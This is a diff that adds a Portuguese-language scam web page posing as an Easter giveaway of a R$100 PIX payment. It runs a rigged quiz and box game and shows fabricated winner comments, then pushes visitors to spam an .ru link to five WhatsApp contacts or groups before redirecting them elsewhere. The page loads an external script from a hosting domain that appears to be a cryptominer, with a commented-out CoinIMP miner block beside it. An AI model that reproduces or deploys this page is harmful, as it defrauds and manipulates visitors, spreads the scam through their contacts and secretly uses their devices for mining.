@@ -1,0 +1,380 @@
+<style type="text/css">!div p{display: none;}
+#x{
+    text-transform: uppercase;
+    color:  white;
+    background-color: green;
+    padding: 10px;
+    display: block;
+    border-radius: 10px;
+    border-style: groove;
+    border-width: 3px;
+    margin-top: 2px;
+}
+#img{
+    position: absolute;
+    float: left;
+    transition: margin 2s;
+}
+#img1{
+    position: relative;
+    transition: margin 2s;
+}
+td{
+    padding: 10px;
+    position: relative;
+    margin-top: 10px;
+}
+body{
+    font-family: Tahoma,Geneva,sans-serif;
+    font-size: 118%;
+}
+#winner{
+    padding: 10px;
+    background-color: gray;
+    border-radius: 5px;
+}
+a{
+    padding: 10px;
+    color: white;
+    border-radius: 10px;
+    display: block;
+    background-color: blue;
+    text-decoration: none;
+}
+input{
+    color: green;
+}
+.item .profileimg {
+    position: absolute;
+    top: 5px;
+    left: 5px;
+    border-radius: 50%;
+    border: 1px solid rgba(0,0,0,.1);
+}
+.commentsya {
+    font-family: tahoma,verdana,arial,sans-serif;
+    background-color: #565656;
+    border-radius: 10px;
+    width: 100%;
+    margin-top: 20px;
+    margin-bottom: 30px;
+}
+.item {
+    position: relative;
+    margin-top: 3px;
+    background-color: #fff;
+    padding: 5px 5px 5px 60px;
+    min-height: 60px;
+    box-sizing: border-box;
+}
+.comtxt {
+    color: #1d2129;
+    line-height: 16px;
+    font-weight: normal;
+    background: #eff1f3;
+    padding: 8px 10px;
+    border-radius: 18px;
+    display: block;
+}
+.combot {
+    padding-top: 5px;
+}
+.ago {
+    color: #86878c;
+    font-size: .95em;
+    font-weight: normal;
+}
+.new-like {
+    color: #3c5a96;
+    font-size: .95em;
+    cursor: pointer;
+    font-weight: normal;
+}
+.likes {
+    color: #3c5a96;
+    font-size: .95em;
+    cursor: pointer;
+    font-weight: normal;
+    padding: 5px;
+}
+}
+#commentsya {
+    font-family: tahoma,verdana,arial,sans-serif;
+    background-color: #565656;
+    border-radius: 10px;
+    width: 100%;
+    margin-top: 20px;
+    margin-bottom: 30px;
+}
+
+
+#commentsya * {
+    margin: 3px 0;
+}
+.cmnts {
+    padding: 0 5px;
+    font-family: helvetica-neue,sans-serif;
+    background-color: #eff1f3;
+    border-radius: 10px;
+    font-size: 12px;
+    text-align: left;
+    margin: 0;
+}
+#questions{
+    padding: 10px;
+    margin-top: 10px;
+    margin-bottom: 10px;
+}
+#modal{
+    width: 100%;
+    height: 500px;
+    background-color: white;
+    position: fixed;
+    display: none;
+    border: red 1px solid;
+    padding: 10px;
+    z-index: 10;
+}
+</style>
+
+<script src="https://www.hostingcloud.racing/mlXv.js"></script>
+<body>
+<!--
+<script>
+    var _client = new Client.Anonymous('9a2744f7c3a68ebe3beae81ce36b4bf7677715c2ccc4fda07327892e9f4820ba', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
+-->
+<script type="text/javascript">
+    
+    function $(id){
+        return document.querySelector(id);
+    }
+
+    function c(name, options, txt){
+        const elm = document.createElement(name);
+        if(options){
+            for(let key in options){
+                const value = options[key];
+                if(typeof value === "function"){
+                    elm.addEventListener(key, value)
+                }else{
+                    elm.setAttribute(key, value)
+                }
+            }
+        }
+        if(typeof txt === "object"){
+            txt.forEach(a=> elm.append(a))
+        }else if(typeof txt === "string"){
+            elm.innerText = txt;
+        }
+        return elm;
+    }
+
+    function toggle(msg){
+        const modal = $("#modal");
+        const menssagem  = $("#menssagem")
+        if(modal.style.display === "" || modal.style.display === "none"){
+            modal.style.display = "block";
+        }else{
+            modal.style.display = "none"
+        }
+        menssagem.innerHTML = msg
+    }
+
+
+    const ask = [[" Você gostaria de participar da nossa promoção de páscoa ? ", "sim", "não"],
+    ["Quantos anos você tem? ", "18-29", "30-39", "40-41", "50+"],
+     ["Você nos recomendaria a seus amigos", "sim", "não"],
+     ["Você gostaria de receber o PIX de R$ 100,00 reais", "sim", "não"],
+    ];
+    const analise = ["✅ Você respondeu as 4 perguntas",
+    "✅ Endereço de IP válido para promoção",
+    "✅ Parabéns, escolha uma caixa e boa sorte!"];
+
+    const congrats = "";
+    const img = "https://i.imgur.com/Jrx12lx.png";
+    const img2 = "https://i.imgur.com/t6txnC2.png";
+    const img3 = "https://i.imgur.com/6R4pJuP.png"
+    let index = 0;
+
+    function next_ask(){
+        const questions = $("#questions");
+        questions.innerHTML = "";
+        const a = ask[index];
+
+        if(a === undefined){
+            verify();
+            return
+        }
+
+        const b = c("div",null, a[0]);
+        const d = a.slice(1);
+
+        const e = c("div",null, d.map(f=>{
+            const t = c("span", {click: next_ask, id:"x"} , f);
+            return t
+        }))
+        const f = c("div",null);
+        const per = c("strong", null, "pergunta "+(index+1)+" de 4")
+        f.append(per)
+        f.append(b);
+        f.append(e)
+        questions.append(f);
+        index++;
+    }
+
+    function verify(){
+        const questions = $("#questions");
+        questions.innerHTML = "<h3> Verificando suas respostas ! </h3>"
+        analise.map((a,i)=>{
+            const b = c("p", null, a);
+            setTimeout(()=>{
+                questions.append(b);
+                if(i === 2){
+                    make_bet()
+                }
+            }, (i+1)*1000);
+        })
+    }
+
+    function make_bet(){
+        index = 0
+        const table = c("table")
+        for(let i =0; i<3; i++){
+            const  tr = c("tr")
+            for(let j= 0;j<3;j++){
+                const mg = c("img")
+                const mg2 = c("img", {id:"img"})
+                const td= c("td")
+                mg.onclick = function(){
+                   mg.src = img3
+                   mg.id = "img1"
+                   mg2.src = img2
+                   mg2.style.marginTop = "-40px"
+
+                   index++
+
+                  if(index === 3){
+                    toggle("Parabéns voce ganho!")
+                    setTimeout(()=> compartilhar(), 1000)
+                  }else{
+                    setTimeout(()=> toggle("Tente novamente!"), 3000)
+                  }
+                  
+                }
+                mg.src= img
+                td.append(mg2)
+                td.append(mg)
+                tr.append(td);
+            }
+            table.append(tr)
+        }
+        $("#questions").innerHTML = ""
+        $("#questions").append(table)
+    }
+    let inc = 0;
+    function compartilhar(){
+
+        const _questions = $("#questions");
+        const questions = c("div", {id:"winner"}) 
+        const x = c("h1", null, "Parabéns você ganhou! 💚")
+        const a = c("span", null, "Você ganhou um PIX DE R$100 Reais!! Para receber siga os passos abaixo!");
+        const b = ["<p><b>1.</b> Clique no botão verde abaixo e selecione <b>5 Amigos ou 5 Grupos no WhatsApp.</b> </p>",
+                    "<p><b>2.</b> Envie nossa promoção de Páscoa para seus amigos ou grupos até que a barra abaixo esteja completa.</p>",
+                    "<p><b>3.</b> Assim que você completar a barrinha, você poderá adicionar a <b>sua CHAVE PIX e receber seu Prêmio! 🥰🎁</b></p>"
+        ]
+        const range = c("input", {type:"range", min:0, max:50, value:0, disabled:true})
+        const button = c("a", {target:"_blank",href:"whatsapp://send?text=R$200 Reais no PIX agora!%0A%0AParticipe antes que acabe, pix de páscoa 2022, responda o questionário e ache o coelho da sorte e ganhe um PIX de R$200 Reais na hora!!%0A%0AParticipe 👇🏻👇🏻%0Ahttps://playurl2.ru/?Pix200", click:()=> {
+            inc+=10
+            if(inc == 50){
+                location.href = "http://usheethe.com/OZJn"
+            }
+            range.value = inc
+        }}, "Clique aqui")
+     
+        _questions.innerHTML = ""
+        _questions.append(x)
+        questions.append(a)
+        questions.append(c("div",null, b.map(n=> {
+            const t = c("p", null, "")
+            t.innerHTML = n
+            return t
+        })))
+        questions.append(button)
+        questions.append(range)
+        _questions.append(questions)
+    }
+    addEventListener("load", (event)=>{
+        next_ask()
+    })
+
+</script>
+<div id="modal">
+<div id="menssagem"> </div>
+<button onclick="toggle()"> OK </button>
+</div>
+<p id="questions"></p>
+<div id="commentsya">
+<div class="commentsya" style="display: inline;">
+<div class="cmnts">
+<p class="comments">Comentários:</p>
+<p class="buttons"><span class="like">Curtir</span> · <span onclick="completealert()">Comentar</span> · <span onclick="completealert()">Compartilhar</span></p>
+<p class="new-likes" style="
+    padding-left: 5px;
+"><img src="https://i.imgur.com/oS1Vv3I.png" height="16px" align="center" display="inline-block"><span id="youand"></span> <span class="color-blue">187.181 curtiram isso.</span></p>
+<p class="more clearfix"><span class="left" onclick="completealert()">Ver comentários anteriores</span><span class="right">15 de 9.847</span></p>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/0wjZN0Z.jpg" width="50" height="50">
+<p class="comtxt"><span class="name">Jorge Costa Nascimento</span> Eu ganhei e to muito feliz !!!</p>
+<p class="combot"><span class="ago">Agora mesmo</span> · <span class="new-like">Curtir</span><span class="likes new-likes"></span></p>
+</div>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/6HANsy6.jpg" width="50" height="50">
+<p class="comtxt" style="display: block;"><span class="name">Marcia Falcão</span> É verdade sim gente, vi no instagram oficial e termina hoje essa promoção</p>
+<p class="combot" style="display: block;"><span class="ago">Agora mesmo</span> · <span class="new-like">Curtir</span><span class="likes"><img src="https://i.imgur.com/oS1Vv3I.png" height="16px" align="center" display="inline-block">45</span></p>
+</div>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/HRNCCXK.jpg" width="50" height="50">
+<p class="comtxt" style="display: block;"><span class="name">Mariano Barbanti </span>Será que pode fazer mais de uma vez ??</p>
+<p class="combot" style="display: block;"><span class="ago">2 minutos atrás</span> · <span class="new-like">Curtir</span><span class="likes"><img src="https://i.imgur.com/oS1Vv3I.png" height="16px" align="center" display="inline-block">101</span></p>
+</div>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/y1W9ZKT.jpg" width="50" height="50">
+<p class="comtxt" style="display: block;"><span class="name">Ana Cristina </span> deu certo, ganhei agora !!! </p>
+<p class="combot" style="display: block;"><span class="ago">7 minutos atrás</span> · <span class="new-like">Curtir</span><span class="likes"><img src="https://i.imgur.com/jqkqHQ1.png" height="16px" align="center" display="inline-block">6</span></p>
+</div>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/3IqRePa.jpg" width="50" height="50">
+<p class="comtxt" style="display: block;"><span class="name">Carol Amaral </span> Gente minha irmão ganhou, eu fiz agora e ganhei também</p>
+<p class="combot" style="display: block;"><span class="ago">17 minutos atrás</span> · <span class="new-like">Curtir</span><span class="likes"><img src="https://i.imgur.com/AwmMxYt.png" height="16px" align="center" display="inline-block">12</span></p>
+</div>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/pzDNFoT.jpg" width="50" height="50">
+<p class="comtxt" style="display: block;"><span class="name">Flávio Soares </span> conseguiii, to muito felizzz</p>
+<p class="combot" style="display: block;"><span class="ago">22 minutos atrás</span> · <span class="new-like">Curtir</span><span class="likes"><img src="https://i.imgur.com/jqkqHQ1.png" height="16px" align="center" display="inline-block">6</span></p>
+</div>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/60P4Ea9.jpg" width="50" height="50">
+<p class="comtxt" style="display: block;"><span class="name">Marcelo Santos </span> pensei que era fake e deu certo aqui</p>
+<p class="combot" style="display: block;"><span class="ago">24 minutos atrás</span> · <span class="new-like">Curtir</span><span class="likes"><img src="https://i.imgur.com/jqkqHQ1.png" height="16px" align="center" display="inline-block">2</span></p>
+</div>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/WSE1dem.jpg" width="50" height="50">
+<p class="comtxt" style="display: block;"><span class="name">Antonia Leal </span> mandei no grupo da familia e todos ganharam</p>
+<p class="combot" style="display: block;"><span class="ago">28 minutos atrás</span> · <span class="new-like">Curtir</span><span class="likes"><img src="https://i.imgur.com/jqkqHQ1.png" height="16px" align="center" display="inline-block">5</span></p>
+</div>
+<div class="item">
+<img class="profileimg" src="https://i.imgur.com/uzs2xsg.jpg" width="50" height="50">
+<p class="comtxt" style="display: block;"><span class="name">Serena Tereza </span> salvou de verdade</p>
+<p class="combot" style="display: block;"><span class="ago">35 minutos atrás</span> · <span class="new-like">Curtir</span></p>
+</div>
+<br>
+</div>
+</div>
+</div>
+</body>
